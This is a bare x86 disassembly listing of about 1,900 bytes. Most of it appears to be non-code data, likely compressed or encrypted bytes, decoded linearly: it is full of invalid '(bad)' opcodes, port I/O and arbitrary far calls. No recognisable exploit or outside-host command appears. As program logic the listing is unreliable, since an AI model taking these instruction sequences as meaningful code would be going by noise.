  48ca81:	jge    0x48caa0
  48ca83:	cs push ebp
  48ca85:	in     al,dx
  48ca86:	push   0x21
  48ca88:	outs   dx,BYTE PTR ds:[esi]
  48ca89:	pop    es
  48ca8a:	pop    ss
  48ca8b:	mov    dh,0xf7
  48ca8d:	pop    es
  48ca8e:	in     eax,dx
  48ca8f:	in     al,dx
  48ca90:	lds    edi,FWORD PTR [ebx]
  48ca92:	rcl    BYTE PTR [ecx],cl
  48ca94:	pop    eax
  48ca95:	lahf   
  48ca96:	inc    esi
  48ca97:	jge    0x48caa9
  48ca99:	scas   al,BYTE PTR es:[edi]
  48ca9a:	inc    ebx
  48ca9b:	mov    eax,ds:0x8368f550
  48caa0:	call   FWORD PTR [edx-0x7fa08ffc]
  48caa6:	lods   al,BYTE PTR ds:[esi]
  48caa7:	nop
  48caa8:	into   
  48caa9:	lods   al,BYTE PTR ds:[esi]
  48caaa:	push   cs
  48caab:	sbb    al,0xe
  48caad:	jle    0x48cab0
  48caaf:	shl    DWORD PTR [eax-0x26369a96],1
  48cab5:	jbe    0x48ca6b
  48cab7:	adc    BYTE PTR [edi+0x28357fff],bh
  48cabd:	cdq    
  48cabe:	sub    ecx,eax
  48cac0:	sbb    edi,edx
  48cac2:	cmp    ebx,edi
  48cac4:	jl     0x48cb3a
  48cac6:	jg     0x48cacd
  48cac8:	cmp    DWORD PTR [ebp-0x8],ecx
  48cacb:	jb     0x48cb3a
  48cacd:	mov    BYTE PTR [ecx-0x2d943efd],bl
  48cad3:	in     eax,dx
  48cad4:	call   DWORD PTR [ebx]
  48cad6:	xlat   BYTE PTR ds:[ebx]
  48cad7:	sub    eax,0x1
  48cada:	sbb    edx,0x0
  48cadd:	cmp    ebx,edx
  48cadf:	jg     0x48caa9
  48cae1:	push   ebp
  48cae2:	clc    
  48cae3:	jl     0x48cadd
  48cae5:	ja     0x48cae3
  48cae7:	inc    edx
  48cae8:	sub    DWORD PTR [edx+0x75],esp
  48caeb:	ret    0xc12b
  48caee:	bound  eax,QWORD PTR [esi+0x30]
  48caf1:	in     eax,0xc0
  48caf3:	mov    eax,ds:0x1de1430
  48caf8:	call   0x5ae264d9
  48cafd:	dec    esi
  48cafe:	add    al,0xc1
  48cb00:	daa    
  48cb01:	fdivr  DWORD PTR [ecx]
  48cb03:	and    dh,cl
  48cb05:	and    ebp,DWORD PTR [esi+eax*1]
  48cb08:	push   edi
  48cb09:	push   ebx
  48cb0a:	push   ecx
  48cb0b:	mov    dh,BYTE PTR [eax-0x7abb7759]
  48cb11:	sar    al,cl
  48cb13:	inc    ebp
  48cb14:	cmp    edi,ebx
  48cb16:	and    BYTE PTR [esi],bl
  48cb18:	in     al,dx
  48cb19:	shl    BYTE PTR [ebp-0x40],0x58
  48cb1d:	dec    esi
  48cb1e:	pop    ecx
  48cb1f:	push   edx
  48cb20:	jmp    0x48cae2
  48cb22:	icebp  
  48cb23:	push   eax
  48cb24:	(bad)  
  48cb25:	imul   ebx,DWORD PTR [edi+0x5103016a],0x27
  48cb2c:	jecxz  0x48cb9b
  48cb2e:	shl    BYTE PTR [eax],1
  48cb30:	push   eax
  48cb31:	ins    DWORD PTR es:[edi],dx
  48cb32:	or     BYTE PTR [ecx+0x7f],dl
  48cb35:	cmp    eax,0x63
  48cb38:	inc    ebp
  48cb39:	(bad)  
  48cb3a:	cld    
  48cb3b:	push   ecx
  48cb3c:	fdivrp st(7),st
  48cb3e:	inc    esi
  48cb3f:	sub    BYTE PTR [ebx*1+0x74a7b402],cl
  48cb46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48cb47:	jo     0x48cae2
  48cb49:	or     esi,DWORD PTR ds:[edi+0x3bd6c1e3]
  48cb50:	rcr    DWORD PTR [esi+0x36e229dd],1
  48cb56:	nop
  48cb57:	je     0x48cb63
  48cb59:	mov    al,cl
  48cb5b:	(bad)  
  48cb5c:	xor    al,0x27
  48cb5e:	inc    esi
  48cb5f:	call   0x3f14adf
  48cb64:	push   edi
  48cb65:	xchg   sp,ax
  48cb67:	ds push 0x878cc415
  48cb6d:	lea    eax,[ecx-0x342daf77]
  48cb73:	mov    al,0xd7
  48cb75:	inc    ebp
  48cb76:	or     al,BYTE PTR [ebx+eax*4+0x75a598be]
  48cb7d:	or     al,0x69
  48cb7f:	scas   al,BYTE PTR es:[edi]
  48cb80:	sub    DWORD PTR [eax],eax
  48cb82:	aam    0x7f
  48cb84:	mov    ds,WORD PTR ds:0x7beca428
  48cb8a:	xlat   BYTE PTR ds:[ebx]
  48cb8b:	jge    0x48cb9e
  48cb8d:	mov    eax,ds:0x1a862748
  48cb92:	or     ch,BYTE PTR [eax-0x79a24fcd]
  48cb98:	rcr    ch,cl
  48cb9a:	xor    cl,BYTE PTR [ebp+ebx*1-0x75]
  48cb9e:	xchg   BYTE PTR [ebp+edi*1-0x66f5335a],bl
  48cba5:	mov    al,ds:0x4054854a
  48cbaa:	daa    
  48cbab:	jmp    0x48cc2a
  48cbad:	out    0xc7,eax
  48cbaf:	xor    ebp,DWORD PTR [ecx+0x7]
  48cbb2:	lahf   
  48cbb3:	sub    BYTE PTR [esi],dh
  48cbb5:	adc    al,0xec
  48cbb7:	or     BYTE PTR [ecx],al
  48cbb9:	(bad)  
  48cbba:	cld    
  48cbbb:	lods   al,BYTE PTR ds:[esi]
  48cbbc:	or     al,0x9a
  48cbbe:	or     al,0x10
  48cbc0:	pop    ss
  48cbc1:	(bad)  
  48cbc2:	push   cs
  48cbc3:	sbb    BYTE PTR [ecx],al
  48cbc5:	add    al,0xe7
  48cbc7:	push   esi
  48cbc8:	call   0x8627:0x82571cbb
  48cbcf:	cwde   
  48cbd0:	in     eax,dx
  48cbd1:	es ins BYTE PTR es:[edi],dx
  48cbd3:	sbb    bh,BYTE PTR es:[edi+0x1d388b89]
  48cbda:	outs   dx,BYTE PTR ds:[esi]
  48cbdb:	test   BYTE PTR ss:[ebx],bh
  48cbde:	sbb    ecx,DWORD PTR ds:0x78c8e80a
  48cbe4:	push   0xffffffc0
  48cbe6:	dec    edi
  48cbe7:	outs   dx,DWORD PTR ds:[esi]
  48cbe8:	inc    esi
  48cbe9:	xchg   edi,eax
  48cbea:	mov    BYTE PTR [ecx],dh
  48cbec:	pop    ebp
  48cbed:	or     cl,BYTE PTR [edi+eiz*1-0x64]
  48cbf1:	push   es
  48cbf2:	iret   
  48cbf3:	cmp    esi,0x8dc209fc
  48cbf9:	push   cs
  48cbfa:	inc    ebx
  48cbfb:	test   BYTE PTR [edx+edx*2+0x9],0xfd
  48cc00:	test   eax,0x56ad65d4
  48cc05:	pop    ds
  48cc06:	add    DWORD PTR [esi],0x71f96ea3
  48cc0c:	mov    eax,DWORD PTR [edi]
  48cc0e:	mov    fs,edx
  48cc10:	inc    ebx
  48cc11:	inc    ecx
  48cc12:	xlat   BYTE PTR ds:[ebx]
  48cc13:	dec    ecx
  48cc14:	test   eax,0x1c3c86e0
  48cc19:	mov    ah,0xb9
  48cc1b:	and    eax,0x1474ec90
  48cc20:	mov    esp,0x5ff9b00c
  48cc25:	sub    DWORD PTR [edx],ecx
  48cc27:	cmp    al,0x7
  48cc29:	test   BYTE PTR [esi],dh
  48cc2b:	sar    DWORD PTR [ebx+ecx*4+0x703b4607],1
  48cc32:	or     BYTE PTR [ebx+0x17],dl
  48cc35:	js     0x48cbe1
  48cc37:	pop    esi
  48cc38:	cld    
  48cc39:	jno    0x48cc50
  48cc3b:	adc    al,0x6a
  48cc3d:	mov    ds:0x7a1748fe,al
  48cc42:	lahf   
  48cc43:	lea    esi,[ebp-0x1bb738c0]
  48cc49:	cwde   
  48cc4a:	adc    DWORD PTR [edi],ecx
  48cc4c:	(bad)  
  48cc4e:	mov    al,0xe5
  48cc50:	mov    DWORD PTR [ecx+0x8],0xc001fc32
  48cc57:	je     0x48cc9c
  48cc59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48cc5a:	call   FWORD PTR ds:0x8702ecbb
  48cc60:	adc    DWORD PTR [edx],eax
  48cc62:	leave  
  48cc63:	das    
  48cc64:	imul   esp,DWORD PTR ds:0xb889171c,0x6fb86412
  48cc6e:	fmul   QWORD PTR [ebp-0x74]
  48cc71:	mov    eax,ds:0xbb9fc2c
  48cc76:	lock add eax,0xd357df9
  48cc7c:	and    al,0x20
  48cc7e:	push   ecx
  48cc7f:	mov    ecx,0xd5536724
  48cc84:	push   ds
  48cc85:	inc    eax
  48cc86:	xchg   edi,eax
  48cc87:	pusha  
  48cc88:	fdivp  st(1),st
  48cc8a:	movzx  esi,dh
  48cc8d:	push   ebp
  48cc8e:	pop    ebp
  48cc8f:	outs   dx,BYTE PTR ds:[esi]
  48cc90:	imul   ecx,DWORD PTR [eax+0x4e700e46],0xffffff84
  48cc97:	push   edi
  48cc98:	jno    0x48cc72
  48cc9a:	pop    DWORD PTR [eax+0x56882f18]
  48cca0:	sbb    BYTE PTR [ebx],bh
  48cca2:	xor    BYTE PTR [eax+0xeb704e7],cl
  48cca8:	add    bl,BYTE PTR [ebx-0x41]
  48ccab:	cli    
  48ccac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ccad:	or     DWORD PTR [ecx-0x2dbf6de4],ebp
  48ccb3:	int3   
  48ccb4:	cmp    BYTE PTR [eax],bh
  48ccb6:	pop    ds
  48ccb7:	lea    edx,[eax+0x63c3f38]
  48ccbd:	inc    ebp
  48ccbe:	xor    BYTE PTR [eax+0x4af2ae46],bh
  48ccc4:	fs call 0x9b3604dd
  48ccca:	nop
  48cccb:	in     al,dx
  48cccc:	or     BYTE PTR [eax+esi*8],dl
  48cccf:	repnz xchg ebp,eax
  48ccd1:	dec    edx
  48ccd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48ccd3:	in     al,0x90
  48ccd5:	nop
  48ccd6:	nop
  48ccd7:	xchg   ecx,eax
  48ccd8:	dec    edx
  48ccd9:	add    BYTE PTR [eax-0x5a116fa6],cl
  48ccdf:	popf   
  48cce0:	adc    cl,BYTE PTR [edx]
  48cce2:	or     BYTE PTR [ecx+edx*4],cl
  48cce5:	aaa    
  48cce6:	adc    BYTE PTR [esi+edi*4-0x35],bl
  48ccea:	in     eax,0x14
  48ccec:	sbb    BYTE PTR [edi+ecx*2],bl
  48ccef:	and    al,0x2c
  48ccf1:	mov    eax,ds:0x30b9e054
  48ccf6:	xchg   cx,ax
  48ccf8:	mov    al,ds:0xb361ff71
  48ccfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ccfe:	and    al,0x51
  48cd00:	push   ebx
  48cd01:	mov    ds:0x55973620,eax
  48cd06:	es ds gs push ebx
  48cd0a:	push   ebx
  48cd0b:	and    bh,BYTE PTR [eax]
  48cd0d:	add    cl,BYTE PTR [edi+ebp*8-0x3]
  48cd11:	dec    ebp
  48cd12:	sub    eax,0x630a2aab
  48cd17:	cmp    al,0x48
  48cd19:	fldcw  WORD PTR [esi+0x18683f6b]
  48cd1f:	push   esi
  48cd20:	pop    eax
  48cd21:	push   edx
  48cd22:	sub    eax,0x58546456
  48cd27:	add    bh,ch
  48cd29:	xor    eax,0x248c5de8
  48cd2e:	ins    BYTE PTR es:[edi],dx
  48cd2f:	fs push ecx
  48cd31:	test   BYTE PTR [eax+0x37],dl
  48cd34:	call   0xc64b:0x90610a68
  48cd3b:	cs xor eax,0x1bad2a19
  48cd41:	dec    esi
  48cd42:	push   edx
  48cd43:	aad    0xe2
  48cd45:	mov    eax,ds:0x7fb8cb1b
  48cd4a:	push   0xfffffff4
  48cd4c:	pusha  
  48cd4d:	pop    eax
  48cd4e:	push   edx
  48cd4f:	inc    eax
  48cd50:	push   ecx
  48cd51:	mov    ds:0x7a97be28,eax
  48cd56:	ja     0x48cd6d
  48cd58:	inc    eax
  48cd59:	out    dx,al
  48cd5a:	adc    BYTE PTR [ebx-0x2d2bee8c],al
  48cd60:	push   eax
  48cd61:	mov    ds:0xfe587d03,al
  48cd66:	(bad)  
  48cd67:	xchg   ecx,eax
  48cd68:	ret    
  48cd69:	xor    al,0xc7
  48cd6b:	mov    eax,0xacb3fb79
  48cd70:	dec    esp
  48cd71:	ins    BYTE PTR es:[edi],dx
  48cd72:	aas    
  48cd73:	mov    ecx,0x9814f144
  48cd78:	lods   al,BYTE PTR ds:[esi]
  48cd79:	into   
  48cd7a:	dec    edx
  48cd7b:	sub    BYTE PTR [eax-0x79],ch
  48cd7e:	rol    BYTE PTR [edx+0x70bac287],0x20
  48cd85:	std    
  48cd86:	dec    eax
  48cd87:	xchg   ebp,eax
  48cd88:	fadd   DWORD PTR [ebp+eiz*4+0x1fc03298]
  48cd8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48cd90:	mov    cl,0xd2
  48cd92:	dec    ebx
  48cd93:	aas    
  48cd94:	pop    esp
  48cd95:	lea    esi,[edi+0x38]
  48cd98:	call   0xa485:0xf8657bf4
  48cd9f:	(bad)  
  48cda0:	in     al,dx
  48cda1:	mov    BYTE PTR [edx+ecx*2+0x1],0xee
  48cda6:	xor    eax,DWORD PTR [ebp+edx*1+0x6c82401c]
  48cdad:	cmp    al,0xbb
  48cdaf:	dec    edi
  48cdb0:	ret    0xb085
  48cdb3:	test   BYTE PTR [ebp-0x536af458],0x89
  48cdba:	pop    eax
  48cdbb:	mov    edx,0x9de8245b
  48cdc0:	mov    eax,0xf89c61d
  48cdc5:	popf   
  48cdc6:	std    
  48cdc7:	repz test BYTE PTR [edx],dh
  48cdca:	add    DWORD PTR [eax],ecx
  48cdcc:	(bad)  
  48cdcd:	pop    esp
  48cdce:	mov    eax,0x13605330
  48cdd3:	jl     0x48cd6f
  48cdd5:	ins    BYTE PTR es:[edi],dx
  48cdd6:	push   esp
  48cdd7:	or     DWORD PTR [eax-0x54772b25],edx
  48cddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48cdde:	fisub  DWORD PTR [edi+0x20041c44]
  48cde4:	pop    ebp
  48cde5:	sub    BYTE PTR [ebp+0x120e85be],ah
  48cdeb:	nop
  48cdec:	shl    BYTE PTR ds:0xd3ea7d98,1
  48cdf2:	ss (bad) 
  48cdf4:	sbb    eax,0x211f0601
  48cdf9:	add    eax,edi
  48cdfb:	mov    DWORD PTR [edi-0x41],ebp
  48cdfe:	dec    esi
  48cdff:	ret    0xe532
  48ce02:	scas   eax,DWORD PTR es:[edi]
  48ce03:	adc    BYTE PTR [eax+0x25042347],cl
  48ce09:	cmp    BYTE PTR [ebp-0x42],al
  48ce0c:	sub    BYTE PTR [ecx-0x6ee39617],0x66
  48ce13:	push   esi
  48ce14:	es push 0x8db817db
  48ce1a:	push   ss
  48ce1b:	mov    DWORD PTR [ebp+0x4],ebx
  48ce1e:	and    bl,bh
  48ce20:	pop    esp
  48ce21:	cmp    DWORD PTR [esi],ecx
  48ce23:	je     0x48ce44
  48ce25:	push   ebx
  48ce26:	loope  0x48cdea
  48ce28:	push   eax
  48ce29:	retf   0xa864
  48ce2c:	adc    BYTE PTR [ebp-0x8],dl
  48ce2f:	(bad)  
  48ce30:	fst    QWORD PTR [eax+0x2f]
  48ce33:	sbb    al,0xff
  48ce35:	rol    BYTE PTR [ebx+0x7501fc7d],1
  48ce3b:	mov    esi,0x5d3a012c
  48ce40:	inc    eax
  48ce41:	xchg   ebp,eax
  48ce42:	pop    ss
  48ce43:	adc    DWORD PTR [edx-0x3c],edx
  48ce46:	mov    DWORD PTR [ebp-0x38],eax
  48ce49:	ror    BYTE PTR [ecx],1
  48ce4b:	and    bh,BYTE PTR ss:[edx+0x19]
  48ce4f:	fdiv   DWORD PTR [edi-0x20]
  48ce52:	cmp    BYTE PTR [esi],dh
  48ce54:	xchg   ebp,eax
  48ce55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ce56:	imul   esp,DWORD PTR [edi-0x1b513c16],0x4cccece4
  48ce60:	ja     0x48ce07
  48ce62:	xor    eax,0x559d2cec
  48ce67:	rcl    BYTE PTR [edx-0x5d],0x8c
  48ce6b:	inc    ebp
  48ce6c:	sbb    ch,BYTE PTR [ecx-0x7d]
  48ce6f:	push   eax
  48ce70:	mov    esi,DWORD PTR ds:0x30036650
  48ce76:	fdiv   QWORD PTR [eax+0x59]
  48ce79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48ce7a:	cli    
  48ce7b:	mov    ch,0x2d
  48ce7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48ce7e:	sbb    al,0xc
  48ce80:	dec    esp
  48ce81:	push   edi
  48ce82:	and    esp,DWORD PTR cs:[esi+edi*2]
  48ce86:	pop    eax
  48ce87:	rcr    DWORD PTR [edx-0x39],1
  48ce8a:	aas    
  48ce8b:	mov    ds:0x6126bcde,eax
  48ce90:	mov    dh,0xc7
  48ce92:	push   edx
  48ce93:	clc    
  48ce94:	call   DWORD PTR [edx+0x1b3b8faa]
  48ce9a:	mov    eax,ds:0x7f0f5f30
  48ce9f:	ficomp WORD PTR [ebx+esi*2+0x0]
  48cea3:	idiv   BYTE PTR [ecx+edi*1-0x7a]
  48cea7:	inc    eax
  48cea8:	and    BYTE PTR [edx+0x75ba445],dh
  48ceae:	dec    eax
  48ceaf:	mov    bl,0x28
  48ceb1:	inc    esi
  48ceb2:	(bad)  
  48ceb3:	mov    BYTE PTR [eax-0x79],cl
  48ceb6:	pop    ss
  48ceb7:	test   edi,eax
  48ceb9:	or     esp,ecx
  48cebb:	add    DWORD PTR [edi+eiz*2-0x61],ebp
  48cebf:	xchg   ebp,eax
  48cec0:	dec    ecx
  48cec1:	cmp    al,0xf4
  48cec3:	adc    dl,ah
  48cec5:	inc    esi
  48cec6:	adc    al,0xc8
  48cec8:	jae    0x48ce56
  48ceca:	and    al,0xe
  48cecc:	repz mov eax,cr6
  48ced0:	push   ebp
  48ced1:	mov    ds:0xf3ea61b2,eax
  48ced6:	cld    
  48ced7:	jmp    0x48cf0c
  48ced9:	pop    ebp
  48ceda:	dec    eax
  48cedb:	enter  0x843,0xa8
  48cedf:	sti    
  48cee0:	pusha  
  48cee1:	sub    al,0x0
  48cee3:	scas   al,BYTE PTR es:[edi]
  48cee4:	mov    al,0xe
  48cee6:	pop    ss
  48cee7:	js     0x48cf04
  48cee9:	bswap  eax
  48ceeb:	out    dx,eax
  48ceec:	mov    edi,0xd2d52ec8
  48cef1:	pop    ss
  48cef2:	mov    al,0xf4
  48cef4:	xchg   BYTE PTR [ecx],al
  48cef6:	jle    0x48cf11
  48cef8:	dec    BYTE PTR [eax+eax*4]
  48cefb:	mov    bh,0xe9
  48cefd:	sbb    BYTE PTR [eax-0x62],ah
  48cf00:	mov    BYTE PTR [edx-0x6a937548],bl
  48cf06:	jbe    0x48cf11
  48cf08:	loopne 0x48cf16
  48cf0a:	cmp    bl,BYTE PTR [edx]
  48cf0c:	pop    ebx
  48cf0d:	cmp    al,0x6
  48cf0f:	xchg   DWORD PTR ds:0x1fc351ac,ebx
  48cf15:	mov    ?,WORD PTR [edi]
  48cf17:	fwait
  48cf18:	or     ebp,DWORD PTR [ebx-0x3c]
  48cf1b:	test   dh,0xca
  48cf1e:	jne    0x48cf71
  48cf20:	push   esi
  48cf21:	push   edx
  48cf22:	loopne 0x48cf89
  48cf24:	jle    0x48cec8
  48cf26:	push   edi
  48cf27:	mov    al,0xea
  48cf29:	test   DWORD PTR [edi],ebx
  48cf2b:	jbe    0x48ceae
  48cf2d:	mov    esp,0x7a834c24
  48cf32:	sbb    al,0x58
  48cf34:	push   ss
  48cf35:	jbe    0x48cfa9
  48cf37:	in     eax,dx
  48cf38:	es icebp 
  48cf3a:	(bad)  
  48cf3b:	xlat   BYTE PTR ds:[ebx]
  48cf3c:	fist   WORD PTR [edi]
  48cf3e:	rcr    BYTE PTR [eax+eax*1-0x2683f783],0x1
  48cf46:	sbb    BYTE PTR [ebx+0x59],0x87
  48cf4a:	adc    BYTE PTR [ebx-0x5e15f7f0],cl
  48cf50:	mov    esi,0xedfa5057
  48cf56:	xchg   ebp,eax
  48cf57:	push   edx
  48cf58:	shl    BYTE PTR [eax],0x0
  48cf5b:	mov    al,ds:0x914f1388
  48cf60:	mov    DWORD PTR [eax],esi
  48cf62:	xchg   ebx,eax
  48cf63:	inc    DWORD PTR ds:0x3401275
  48cf69:	xor    al,0x52
  48cf6b:	and    BYTE PTR [ecx-0x13],al
  48cf6e:	or     ebx,esp
  48cf70:	pop    es
  48cf71:	int3   
  48cf72:	push   ss
  48cf73:	mov    bh,0xfd
  48cf75:	mov    eax,ds:0xa17851df
  48cf7a:	lock cmp di,WORD PTR [ebx-0x6bc30afb]
  48cf82:	and    bl,BYTE PTR [ebp-0x4d]
  48cf85:	mov    esi,0x144cd9ad
  48cf8a:	xor    DWORD PTR [edx],esp
  48cf8c:	mov    dl,0x91
  48cf8e:	cwde   
  48cf8f:	sbb    BYTE PTR [ecx-0x1309f46c],al
  48cf95:	mov    dl,0x56
  48cf97:	xor    al,0x56
  48cf99:	pop    ebp
  48cf9a:	inc    esi
  48cf9b:	jne    0x48cf99
  48cf9d:	mov    eax,0x4756c383
  48cfa2:	ror    BYTE PTR [eax],0x10
  48cfa5:	or     edi,edi
  48cfa7:	or     DWORD PTR [edi],0xeed4ab01
  48cfad:	dec    esi
  48cfae:	jnp    0x48cf39
  48cfb0:	mov    BYTE PTR [esi+0xf],bh
  48cfb3:	je     0x48cf95
  48cfb5:	pop    esp
  48cfb6:	ins    BYTE PTR es:[edi],dx
  48cfb7:	inc    edx
  48cfb8:	adc    al,0x7c
  48cfba:	cmp    DWORD PTR [eax+0x2445800c],0x56
  48cfc1:	jle    0x48cffe
  48cfc3:	mov    cl,BYTE PTR [eax+eax*1]
  48cfc6:	jbe    0x48cf67
  48cfc8:	pusha  
  48cfc9:	mov    edi,0x5834b49f
  48cfce:	xor    al,0x1
  48cfd0:	push   0x8
  48cfd2:	loopne 0x48cf55
  48cfd4:	int    0xec
  48cfd6:	imul   esi,DWORD PTR [eax-0x5a]
  48cfda:	add    al,0x16
  48cfdc:	cmp    DWORD PTR [eax-0x1a],0xf300bd76
  48cfe3:	push   eax
  48cfe4:	(bad)  
  48cfe5:	xchg   ebx,eax
  48cfe6:	int    0x90
  48cfe8:	ja     0x48d066
  48cfea:	iret   
  48cfeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48cfec:	xor    al,0x30
  48cfee:	icebp  
  48cfef:	dec    esp
  48cff0:	inc    eax
  48cff1:	(bad)  
  48cff2:	fisttp WORD PTR [ecx+0xf57136a]
  48cff8:	mov    BYTE PTR [ecx],0x4a
  48cffb:	inc    edi
  48cffc:	call   0x8917:0x2f082199
  48d003:	mov    al,0xa3
  48d005:	jge    0x48cf89
  48d007:	adc    ah,BYTE PTR [edi]
  48d009:	adc    esi,DWORD PTR [ebx+ecx*4+0x42]
  48d00d:	add    al,0x88
  48d00f:	pop    edx
  48d010:	(bad)  
  48d011:	mov    cs,WORD PTR [edi-0x39c4be3b]
  48d017:	jl     0x48d008
  48d019:	cmp    dl,BYTE PTR [ecx+eax*2-0x7c]
  48d01d:	mov    edi,0xfebfd3e6
  48d022:	ror    DWORD PTR [ecx+0x394df018],1
  48d028:	test   DWORD PTR [eax+0x14],ebp
  48d02b:	add    bh,BYTE PTR [ebx+edx*2-0x5f]
  48d02f:	add    ch,al
  48d031:	push   ebp
  48d032:	jo     0x48d093
  48d034:	dec    ecx
  48d035:	inc    esi
  48d036:	sahf   
  48d037:	je     0x48d04f
  48d039:	mov    DWORD PTR [edx+0x13],ecx
  48d03c:	into   
  48d03d:	xchg   ecx,eax
  48d03e:	sar    DWORD PTR [ebx],0xe1
  48d041:	sbb    BYTE PTR [edx-0x68fa3903],cl
  48d047:	mov    eax,0x1fc33358
  48d04c:	push   cs
  48d04d:	inc    ebp
  48d04e:	mov    ecx,esi
  48d050:	icebp  
  48d051:	lds    ecx,FWORD PTR [eax]
  48d053:	push   ecx
  48d054:	fmul   DWORD PTR [edi-0x36057225]
  48d05a:	aam    0x54
  48d05c:	call   0xf64a:0xd20fd34a
  48d063:	pop    edx
  48d064:	call   DWORD PTR [ebp-0x63]
  48d067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d068:	shr    BYTE PTR [ebp-0x25],cl
  48d06b:	xor    BYTE PTR [edx+0x10],0xc4
  48d06f:	adc    al,BYTE PTR ds:0x4a9210a7
  48d075:	pop    ecx
  48d076:	mov    esi,0xab1296f6
  48d07b:	aas    
  48d07c:	scas   al,BYTE PTR es:[edi]
  48d07d:	mov    ebp,0x24e2ff45
  48d082:	jg     0x48d094
  48d084:	cmp    bh,al
  48d086:	mov    DWORD PTR [ebp-0x8],0x8b1b3175
  48d08d:	adc    eax,eax
  48d08f:	mov    esp,0xc15fa0b9
  48d094:	cmp    dl,al
  48d096:	mov    al,0x75
  48d098:	sbb    al,0x8d
  48d09a:	xchg   esp,edi
  48d09c:	loope  0x48d060
  48d09e:	cdq    
  48d09f:	(bad)  
  48d0a0:	in     al,0xcc
  48d0a2:	push   cs
  48d0a3:	mov    es,WORD PTR [ecx-0x77]
  48d0a6:	or     dh,BYTE PTR [ecx+eax*2]
  48d0a9:	out    0x30,eax
  48d0ab:	push   ds
  48d0ac:	add    DWORD PTR [ecx-0x71c53a39],0x28
  48d0b3:	test   BYTE PTR [edi],bh
  48d0b5:	inc    eax
  48d0b6:	cmp    BYTE PTR [ebx+0x2667cb66],0x9f
  48d0bd:	les    ecx,FWORD PTR [ecx+0x1a90f45d]
  48d0c3:	ins    BYTE PTR es:[edi],dx
  48d0c4:	jmp    0x509e:0xc4fb9a06
  48d0cb:	push   esi
  48d0cc:	dec    ebp
  48d0cd:	hlt    
  48d0ce:	mov    fs,WORD PTR [ebp-0xbe4e92d]
  48d0d4:	push   es
  48d0d5:	xchg   edx,eax
  48d0d6:	push   edi
  48d0d7:	ss push cs
  48d0d9:	test   eax,0xfdf4c624
  48d0de:	pop    ss
  48d0df:	mov    ds:0x75707880,eax
  48d0e4:	call   0xc8c64338
  48d0e9:	xor    bl,BYTE PTR [eax+ecx*1]
  48d0ec:	pop    ds
  48d0ed:	mov    dl,dl
  48d0ef:	aas    
  48d0f0:	push   es
  48d0f1:	xchg   esp,eax
  48d0f2:	push   cs
  48d0f3:	sub    cl,BYTE PTR [ecx]
  48d0f5:	rol    DWORD PTR [ecx],cl
  48d0f7:	sbb    ah,ah
  48d0f9:	ret    
  48d0fa:	bnd jns 0x48d0fb
  48d0fd:	sbb    eax,esp
  48d0ff:	or     DWORD PTR [edi],ecx
  48d101:	test   cl,ah
  48d103:	(bad)  
  48d104:	rcl    al,cl
  48d106:	(bad)  
  48d107:	cmp    BYTE PTR [ebp+0x21],ch
  48d10a:	cmp    al,0xcc
  48d10c:	jmp    0x48d0d0
  48d10e:	mov    edx,0xb050ca38
  48d113:	inc    eax
  48d114:	cmp    BYTE PTR [edx],cl
  48d116:	inc    edi
  48d117:	lods   eax,DWORD PTR ds:[esi]
  48d118:	inc    esi
  48d119:	ds inc esi
  48d11b:	xor    dh,BYTE PTR [edx]
  48d11d:	xor    DWORD PTR [ecx-0xecf2b1c],0x7bbf2377
  48d127:	retf   0x564b
  48d12a:	push   0x24
  48d12c:	mov    dh,0x44
  48d12e:	nop
  48d12f:	imul   edx,DWORD PTR [ebx+0x47],0x46cfb75
  48d136:	pop    eax
  48d137:	lds    esi,FWORD PTR [eax]
  48d139:	imul   ecx,DWORD PTR [ebx],0xffffff82
  48d13c:	imul   edx,DWORD PTR [ecx+0x37],0x43
  48d140:	arpl   WORD PTR [ebx],cx
  48d142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d143:	and    bh,bh
  48d145:	stos   BYTE PTR es:[edi],al
  48d146:	push   es
  48d147:	adc    ebp,DWORD PTR [edi+0xfc3a2fb]
  48d14d:	xor    edx,DWORD PTR [ebx]
  48d14f:	inc    edx
  48d150:	jp     0x48d182
  48d152:	ins    BYTE PTR es:[edi],dx
  48d153:	test   eax,0x4ec89abe
  48d158:	push   es
  48d159:	aaa    
  48d15a:	cmp    BYTE PTR [esi+0x4e],al
  48d15d:	inc    ebx
  48d15e:	push   es
  48d15f:	pop    edi
  48d160:	xor    eax,0x7a025aa5
  48d165:	jne    0x48d187
  48d167:	push   0x3a18d58c
  48d16c:	push   cs
  48d16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d16e:	mov    ebp,0xf9e06df
  48d173:	push   0x22502098
  48d178:	adc    al,0xce
  48d17a:	or     edx,DWORD PTR [edx]
  48d17c:	add    BYTE PTR [ecx+0x65],ch
  48d17f:	lods   eax,DWORD PTR ds:[esi]
  48d180:	call   0x59234a8c
  48d185:	pop    ebx
  48d186:	cmp    esi,DWORD PTR [ebx]
  48d188:	lahf   
  48d189:	sbb    edi,DWORD PTR [eax]
  48d18b:	mov    ch,0x74
  48d18d:	sahf   
  48d18e:	inc    esi
  48d18f:	push   ss
  48d190:	imul   ecx,DWORD PTR [eax+edi*4],0x12f023b7
  48d197:	std    
  48d198:	inc    edi
  48d199:	push   edx
  48d19a:	inc    eax
  48d19b:	jb     0x48d188
  48d19d:	pop    edi
  48d19e:	mov    esi,0xcc20d74c
  48d1a3:	xor    al,0x73
  48d1a5:	or     ah,BYTE PTR [ecx]
  48d1a7:	and    DWORD PTR [edx+0x69f92ae],esp
  48d1ad:	or     al,0x7f
  48d1af:	out    dx,al
  48d1b0:	xchg   edx,eax
  48d1b1:	cs leave 
  48d1b3:	test   DWORD PTR [eax],ecx
  48d1b5:	jne    0x48d19d
  48d1b7:	mov    ecx,DWORD PTR [ebx+0x7f]
  48d1ba:	mov    dh,0xdf
